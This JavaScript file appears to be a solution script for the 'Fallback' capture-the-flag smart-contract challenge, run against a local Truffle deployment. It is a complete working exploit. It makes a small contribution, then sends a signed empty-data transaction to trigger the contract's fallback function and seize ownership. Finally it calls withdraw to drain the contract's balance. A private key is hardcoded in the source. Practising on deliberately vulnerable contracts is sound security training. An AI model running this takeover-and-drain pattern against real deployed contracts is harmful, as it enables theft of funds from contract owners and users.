// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');

const fallback = require('./build/contracts/Fallback.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    'a3ade3bffea3a3af6c4fdcb7305a3f26a2baff5b97e2f061fadebb9215b6460b';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();
  const contractAddress = fallback.networks[networkId].address;
  const contract = new web3.eth.Contract(fallback.abi, contractAddress);
  // We first qualify for using the fallback function. We have to send any
  // amount of ether to it > 0
  await contract.methods
    .contribute()
    .send({from: publicKey, value: web3.utils.toWei('0.0009', 'ether')});

  let balance;
  balance = await web3.eth.getBalance(publicKey);
  console.log(
    'Attacker balance:',
    web3.utils.fromWei(balance, 'ether'),
    'ether',
  );

  const count = await web3.eth.getTransactionCount(publicKey);
  const rawTx = {
    from: publicKey,
    to: contractAddress,
    nonce: web3.utils.toHex(count),
    gasPrice: web3.utils.toHex(web3.utils.toWei('21', 'gwei')),
    gasLimit: web3.utils.toHex(2100000),
    // Here we need to have a value > 0
    value: web3.utils.toHex(1),
    // To call a fallback function in solidity, we have to call it with either
    // leaving data out of the payload or by defining it as the empty string
    data: '',
  };
  var tx = new Tx(rawTx);
  tx.sign(Buffer.from(privateKey, 'hex'));
  try {
    console.log(
      'Calling fallback function with no data argument to become contract owner',
    );
    await web3.eth.sendSignedTransaction('0x' + tx.serialize().toString('hex'));
  } catch (e) {
    console.log(e);
  }

  balance = await web3.eth.getBalance(publicKey);
  console.log(
    'Attacker balance:',
    web3.utils.fromWei(balance, 'ether'),
    'ether',
  );
  // As a sanity check, let's get our own contribution
  const contribution = await contract.methods
    .getContribution()
    .call({from: publicKey});
  console.log(
    'My contribution :',
    web3.utils.fromWei(contribution, 'ether'),
    'ether',
  );

  // And lets make sure that we've executed the fallback function correctly and
  // that we're now the owner of the contract by comparing our public key to
  // the owner's.
  const owner = await contract.methods.owner().call({from: publicKey});
  console.log(
    'Are we the owner?',
    web3.utils.toChecksumAddress(owner) ===
      web3.utils.toChecksumAddress(publicKey),
  );

  console.log(
    'Calling withdraw method which only only can do to withdraw balance',
  );
  // Lastly, let's withdraw the remaining balance of the contract back to our
  // address
  await contract.methods.withdraw().send({from: publicKey});
  balance = await web3.eth.getBalance(publicKey);
  console.log(
    'Attacker balance:',
    web3.utils.fromWei(balance, 'ether'),
    'ether',
  );
})();
